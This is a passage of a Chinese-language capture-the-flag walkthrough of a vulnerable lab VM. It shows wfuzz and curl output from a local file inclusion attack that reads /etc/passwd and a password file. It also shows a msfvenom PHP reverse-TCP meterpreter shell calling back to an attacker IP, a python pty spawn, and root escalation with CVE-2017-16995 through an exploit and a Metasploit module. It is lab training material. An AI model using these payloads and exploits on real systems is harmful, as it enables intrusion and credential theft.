                                                                                                                                                            </span><br><span class="line">000000026:   200        7 L      12 W     136 Ch      <span class="string">"dl"</span>                                                                                                                                                                          </span><br><span class="line">000000027:   200        7 L      12 W     136 Ch      <span class="string">"download"</span>                                                                                                                                                                    </span><br><span class="line">000000029:   200        7 L      12 W     136 Ch      <span class="string">"enable"</span>                                                                                                                                                                      </span><br><span class="line">000000030:   200        7 L      12 W     136 Ch      <span class="string">"encrypt"</span>                                                                                                                                                                     </span><br><span class="line">000000028:   200        7 L      12 W     136 Ch      <span class="string">"edit"</span>                                                                                                                                                                        </span><br><span class="line">000000031:   200        7 L      12 W     136 Ch      <span class="string">"exec"</span>                                                                                                                                                                        </span><br><span class="line">000000032:   200        7 L      12 W     136 Ch      <span class="string">"execute"</span>                                                                                                                                                                     </span><br><span class="line">000000033:   200        7 L      19 W     206 Ch      <span class="string">"file"</span>                                                                                                                                                                        </span><br><span class="line">000000034:   200        7 L      12 W     136 Ch      <span class="string">"focus"</span>                                                                                                                                                                       </span><br><span class="line">000000035:   200        7 L      12 W     136 Ch      <span class="string">"get"</span>                                                                                                                                                                         </span><br><span class="line">000000036:   200        7 L      12 W     136 Ch      <span class="string">"help"</span>                                                                                                                                                                        </span><br><span class="line">000000037:   200        7 L      12 W     136 Ch      <span class="string">"initiate"</span>                                                                                                                                                                    </span><br><span class="line">000000038:   200        7 L      12 W     136 Ch      <span class="string">"is"</span>                                                                                                                                                                          </span><br><span class="line">000000041:   200        7 L      12 W     136 Ch      <span class="string">"ls"</span>                                                                                                                                                                          </span><br><span class="line">000000042:   200        7 L      12 W     136 Ch      <span class="string">"make"</span>                                                                                                                                                                        </span><br><span class="line">000000043:   200        7 L      12 W     136 Ch      <span class="string">"mod"</span>                                                                                                                                                                         </span><br><span class="line">000000044:   200        7 L      12 W     136 Ch      <span class="string">"mode"</span>                                                                                                                                                                        </span><br><span class="line">000000046:   200        7 L      12 W     136 Ch      <span class="string">"move"</span>                                                                                                                                                                        </span><br><span class="line">000000047:   200        7 L      12 W     136 Ch      <span class="string">"new"</span>                                                                                                                                                                         </span><br><span class="line">000000048:   200        7 L      12 W     136 Ch      <span class="string">"off"</span>                                                                                                                                                                         </span><br><span class="line">000000049:   200        7 L      12 W     136 Ch      <span class="string">"on"</span>                                                                                                                                                                          </span><br><span class="line">000000039:   200        7 L      12 W     136 Ch      <span class="string">"list"</span>                                                                                                                                                                        </span><br><span class="line">000000040:   200        7 L      12 W     136 Ch      <span class="string">"load"</span>                                                                                                                                                                        </span><br><span class="line">000000045:   200        7 L      12 W     136 Ch      <span class="string">"modify"</span>                                                                                                                                                                      </span><br><span class="line">000000050:   200        7 L      12 W     136 Ch      <span class="string">"open"</span>                                                                                                                                                                        </span><br><span class="line">000000054:   200        7 L      12 W     136 Ch      <span class="string">"put"</span>                                                                                                                                                                         </span><br><span class="line">000000055:   200        7 L      12 W     136 Ch      <span class="string">"query"</span>                                                                                                                                                                       </span><br><span class="line">000000056:   200        7 L      12 W     136 Ch      <span class="string">"read"</span>                                                                                                                                                                        </span><br><span class="line">000000051:   200        7 L      12 W     136 Ch      <span class="string">"post"</span>                                                                                                                                                                        </span><br><span class="line">000000052:   200        7 L      12 W     136 Ch      <span class="string">"proxy"</span>                                                                                                                                                                       </span><br><span class="line">000000053:   200        7 L      12 W     136 Ch      <span class="string">"pull"</span>                                                                                                                                                                        </span><br><span class="line">000000062:   200        7 L      12 W     136 Ch      <span class="string">"save"</span>                                                                                                                                                                        </span><br><span class="line">000000058:   200        7 L      12 W     136 Ch      <span class="string">"rename"</span>                                                                                                                                                                      </span><br><span class="line">000000060:   200        7 L      12 W     136 Ch      <span class="string">"retrieve"</span>                                                                                                                                                                    </span><br><span class="line">000000061:   200        7 L      12 W     136 Ch      <span class="string">"run"</span>                                                                                                                                                                         </span><br><span class="line">000000057:   200        7 L      12 W     136 Ch      <span class="string">"remove"</span>                                                                                                                                                                      </span><br><span class="line">000000059:   200        7 L      12 W     136 Ch      <span class="string">"reset"</span>                                                                                                                                                                       </span><br><span class="line">000000063:   200        7 L      12 W     136 Ch      <span class="string">"search"</span>                                                                                                                                                                      </span><br><span class="line">000000064:   200        7 L      12 W     136 Ch      <span class="string">"send"</span>                                                                                                                                                                        </span><br><span class="line">000000065:   200        7 L      12 W     136 Ch      <span class="string">"shell"</span>                                                                                                                                                                       </span><br><span class="line">000000066:   200        7 L      12 W     136 Ch      <span class="string">"show"</span>                                                                                                                                                                        </span><br><span class="line">000000070:   200        7 L      12 W     136 Ch      <span class="string">"to"</span>                                                                                                                                                                          </span><br><span class="line">000000071:   200        7 L      12 W     136 Ch      <span class="string">"toggle"</span>                                                                                                                                                                      </span><br><span class="line">000000072:   200        7 L      12 W     136 Ch      <span class="string">"update"</span>                                                                                                                                                                      </span><br><span class="line">000000073:   200        7 L      12 W     136 Ch      <span class="string">"upload"</span>                                                                                                                                                                      </span><br><span class="line">000000074:   200        7 L      12 W     136 Ch      <span class="string">"verify"</span>                                                                                                                                                                      </span><br><span class="line">000000075:   200        7 L      12 W     136 Ch      <span class="string">"view"</span>                                                                                                                                                                        </span><br><span class="line">000000076:   200        7 L      12 W     136 Ch      <span class="string">"vrfy"</span>                                                                                                                                                                        </span><br><span class="line">000000067:   200        7 L      12 W     136 Ch      <span class="string">"snd"</span>                                                                                                                                                                         </span><br><span class="line">000000068:   200        7 L      12 W     136 Ch      <span class="string">"subtract"</span>                                                                                                                                                                    </span><br><span class="line">000000069:   200        7 L      12 W     136 Ch      <span class="string">"test"</span>                                                                                                                                                                        </span><br><span class="line">000000077:   200        7 L      12 W     136 Ch      <span class="string">"with"</span>                                                                                                                                                                        </span><br><span class="line"></span><br><span class="line">Total time: 0.083242</span><br><span class="line">Processed Requests: 77</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 925.0118</span><br><span class="line"></span><br><span class="line">➜  ~ wfuzz -c --hh 136 -w Kali-Team_Tools/fuzzdb/attack/business-logic/CommonMethodNames.txt <span class="string">'http://192.168.116.132/index.php?FUZZ=/etc/passwd'</span></span><br><span class="line">libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /home/kali-team/.<span class="built_in">local</span>/lib/python3.7/site-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named <span class="string">'shodan'</span></span><br><span class="line">libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /home/kali-team/.<span class="built_in">local</span>/lib/python3.7/site-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named <span class="string">'shodan'</span></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4 - The Web Fuzzer                           *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.116.132/index.php?FUZZ=/etc/passwd</span><br><span class="line">Total requests: 77</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                       </span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000000033:   200        7 L      19 W     206 Ch      <span class="string">"file"</span>                                                                                                                                                                        </span><br><span class="line"></span><br><span class="line">Total time: 0.118026</span><br><span class="line">Processed Requests: 77</span><br><span class="line">Filtered Requests: 76</span><br><span class="line">Requests/sec.: 652.3932</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>fuzz出来index.php可以接受file参数,<code>http://192.168.116.132/index.php?file=/ect/passed</code>，和之前的首页长度不同。在上面提示中可以试着读取<code>http://192.168.116.132/index.php?file=location.txt</code>，又发现一个提示。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.116.132/index.php\?file\=location.txt                                 </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HacknPentest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'hacknpentest.png'</span> <span class="attr">alt</span>=<span class="string">'hnp security'</span> <span class="attr">width</span>=<span class="string">"1300"</span> <span class="attr">height</span>=<span class="string">"595"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Do something better <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>ok well Now you reah at the exact parameter <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Now dig some more for next one <span class="tag">&lt;<span class="name">br</span>&gt;</span>use 'secrettier360' parameter on some other php page for more fun.</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>提示到其他页面测试secrettier360这个参数，在dirb扫出来的一个就两个特殊的php文件。所以就是<code>http://192.168.116.132/image.php</code>，加上<code>secrettier360</code>继续fuzz测试。发现存在任意文件读取<code>http://192.168.116.132/image.php?secrettier360=/etc/passwd</code>，读取<code>/etc/passed</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.116.132/image.php\?secrettier360\=/etc/passwd                                                    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=<span class="string">'hacknpentest.png'</span> alt=<span class="string">'hnp security'</span> width=<span class="string">"1300"</span> height=<span class="string">"595"</span> /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/<span class="literal">false</span></span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/<span class="literal">false</span></span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/<span class="literal">false</span></span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/<span class="literal">false</span></span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/<span class="literal">false</span></span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/<span class="literal">false</span></span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/<span class="literal">false</span></span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/<span class="literal">false</span></span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/<span class="literal">false</span></span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/<span class="literal">false</span></span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/<span class="literal">false</span></span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/<span class="literal">false</span></span><br><span class="line">victor:x:1000:1000:victor,,,:/home/victor:/bin/bash</span><br><span class="line">mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">saket:x:1001:1001:find password.txt file <span class="keyword">in</span> my directory:/home/saket:</span><br><span class="line">sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">guest-uw1hdg:x:999:999:Guest:/tmp/guest-uw1hdg:/bin/bash</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>有一个访客的账号,还有一个victor账号，然后发现访客账号可以直接登录，在正常情况下是不可能可以登录到服务器的。在服务器开放了VNC服务，才有可能登录访客账号。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">victor:x:1000:1000:victor,,,:/home/victor:/bin/bash</span><br><span class="line">guest-uw1hdg:x:999:999:Guest:/tmp/guest-uw1hdg:/bin/bash</span><br><span class="line">saket:x:1001:1001:find password.txt file <span class="keyword">in</span> my directory:/home/saket:</span><br></pre></td></tr></table></figure>
<ul>
<li>登录进访客账号，发现/opt目录下有一个服务器备份文件夹</li>
</ul>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">your password <span class="keyword">for</span> backup_database <span class="built_in">file</span> enc <span class="keyword">is</span> </span><br><span class="line"></span><br><span class="line"><span class="string">"backup_password"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Enjoy!</span><br></pre></td></tr></table></figure>
<ul>
<li>后来查看Linux版本，发现可以直接提权。额，这样就很没意思了，本来就很没意思。反正到最后还是要用到EXP去提权的，但是不是直接登录访客账号。而且访客提权还把Web服务提挂了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">guest-uw1hdg@ubuntu:~/Desktop$ gcc exp.c </span><br><span class="line">guest-uw1hdg@ubuntu:~/Desktop$ ./a.out </span><br><span class="line">[.] </span><br><span class="line">[.] t(-_-t) exploit <span class="keyword">for</span> counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)</span><br><span class="line">[.] </span><br><span class="line">[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **</span><br><span class="line">[.] </span><br><span class="line">[*] creating bpf map</span><br><span class="line">[*] sneaking evil bpf past the verifier</span><br><span class="line">[*] creating socketpair()</span><br><span class="line">[*] attaching bpf backdoor to socket</span><br><span class="line">[*] skbuff =&gt; ffff955bf2847500</span><br><span class="line">[*] Leaking sock struct from ffff955bef6a6c00</span><br><span class="line">[*] Sock-&gt;sk_rcvtimeo at offset 592</span><br><span class="line">[*] Cred structure at ffff955bf0c7e0c0</span><br><span class="line">[*] UID from cred structure: 999, matches the current: 999</span><br><span class="line">[*] hammering cred structure at ffff955bf0c7e0c0</span><br><span class="line">[*] credentials patched, launching shell...</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),999(guest-uw1hdg)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h2 id="走正常流程"><a href="#走正常流程" class="headerlink" title="走正常流程"></a>走正常流程</h2><ul>
<li>目标是拿到saket用户目录的password.txt文件。尝试<code>http://192.168.116.132/image.php?secrettier360=/home/saket/password.txt</code>，得到密码为：<code>follow_the_ippsec</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.116.132/image.php\?secrettier360\=/home/saket/password.txt  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HacknPentest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'hacknpentest.png'</span> <span class="attr">alt</span>=<span class="string">'hnp security'</span> <span class="attr">width</span>=<span class="string">"1300"</span> <span class="attr">height</span>=<span class="string">"595"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">finaly you got the right parameter<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>follow_the_ippsec</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>在WordPress的文章里找作者的用户名，就只有一篇文章，作者是<code>victor</code>，账号密码登录，所以在WordPress中要设置作者的别名，不会被别人猜出来登录账号。</li>
<li>进入后台上传木马，这些就不用说了。各种各样的方法，修改主题。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.116.1 LPORT=7788 -o shell.php </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 30656 bytes</span><br><span class="line">Saved as: shell.php</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/m</span><br><span class="line">Display all 313 possibilities? (y or n)</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload php/meterpreter_reverse_tcp </span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 7788</span><br><span class="line">lport =&gt; 7788</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.116.1</span><br><span class="line">lhost =&gt; 192.168.116.1</span><br><span class="line">msf5 exploit(multi/handler) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.116.1:7788 </span><br><span class="line">[*] Meterpreter session 1 opened (192.168.116.1:7788 -&gt; 192.168.116.132:43802) at 2019-09-20 11:31:27 +0800</span><br></pre></td></tr></table></figure>
<ul>
<li>交互终端：python -c ‘import pty;pty.spawn(“/bin/bash”)’</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@ubuntu</span><span class="symbol">:/home/saket</span><span class="variable">$ </span>uname -a	</span><br><span class="line">uname -a</span><br><span class="line">Linux ubuntu <span class="number">4.10</span>.<span class="number">0</span>-<span class="number">28</span>-generic <span class="comment">#32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">www-data<span class="variable">@ubuntu</span><span class="symbol">:/home/saket</span>$</span><br></pre></td></tr></table></figure>
<ul>
<li><p>CVE-2017-16995提权，<code>https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-16995</code></p>
</li>
<li><p>上传到服务器然后gcc编译执行就可以拿到Root权限了。</p>
</li>
<li><p>或者用msf自带的</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use exploit/linux/<span class="built_in">local</span>/bpf_sign_extension_priv_esc</span><br><span class="line">msf5 exploit(linux/<span class="built_in">local</span>/bpf_sign_extension_priv_esc) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">msf5 exploit(linux/<span class="built_in">local</span>/bpf_sign_extension_priv_esc) &gt; <span class="built_in">set</span> lhost 192.168.116.1</span><br><span class="line">lhost =&gt; 192.168.116.1</span><br><span class="line">msf5 exploit(linux/<span class="built_in">local</span>/bpf_sign_extension_priv_esc) &gt; run </span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.116.1:4444 </span><br><span class="line">[*] Writing <span class="string">'/tmp/.Glz23KY6oY.c'</span> (10867 bytes) ...</span><br><span class="line">[*] Writing <span class="string">'/tmp/.UaPN30M'</span> (207 bytes) ...</span><br><span class="line">[*] Launching exploit ...</span><br><span class="line">[*] Sending stage (985320 bytes) to 192.168.116.132</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.116.1:4444 -&gt; 192.168.116.132:48326) at 2019-09-20 12:40:28 +0800</span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer     : 192.168.116.132</span><br><span class="line">OS           : Ubuntu 16.04 (Linux 4.10.0-28-generic)</span><br><span class="line">Architecture : x64</span><br><span class="line">BuildTuple   : i486-linux-musl</span><br><span class="line">Meterpreter  : x86/linux</span><br><span class="line">meterpreter &gt; shell </span><br><span class="line">Process 2362 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
<h2 id="非EXP提权"><a href="#非EXP提权" class="headerlink" title="非EXP提权"></a>非EXP提权</h2><p>其实saket目录下有一个enc的执行文件，执行后输入上面找到的backup_pass的密码，复制了两个文件到saket的home目录，拿到enc.txt和key.txt。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/home/saket$ ./enc</span><br><span class="line">./enc</span><br><span class="line">enter password: backup_password</span><br><span class="line">backup_password</span><br><span class="line">good</span><br><span class="line">/bin/cp: cannot <span class="built_in">stat</span> <span class="string">'/root/enc.txt'</span>: Permission denied</span><br><span class="line">/bin/cp: cannot <span class="built_in">stat</span> <span class="string">'/root/key.txt'</span>: Permission denied</span><br><span class="line">www-data@ubuntu:/home/saket$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@ubuntu:/home/saket$ sudo ./enc</span><br><span class="line">sudo ./enc</span><br><span class="line">enter password: backup_password</span><br><span class="line">backup_password</span><br><span class="line">good</span><br><span class="line">www-data@ubuntu:/home/saket$ ls</span><br><span class="line">ls</span><br><span class="line">enc  enc.txt  key.txt  password.txt  user.txt</span><br><span class="line">www-data@ubuntu:/home/saket$</span><br></pre></td></tr></table></figure>
<ul>
<li>解密后base64解码后得到saket的密码为<code>tribute_to_ippsec</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> <span class="string">"RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw="</span>|base64 -d</span><br><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And <span class="keyword">if</span> you forget </span><br><span class="line">your username <span class="keyword">then</span> use your old password</span><br><span class="line">==&gt; <span class="string">"tribute_to_ippsec"</span></span><br><span class="line"></span><br><span class="line">Victor,%</span><br></pre></td></tr></table></figure>
<ul>
<li>切换到saket用户</li>
</ul>
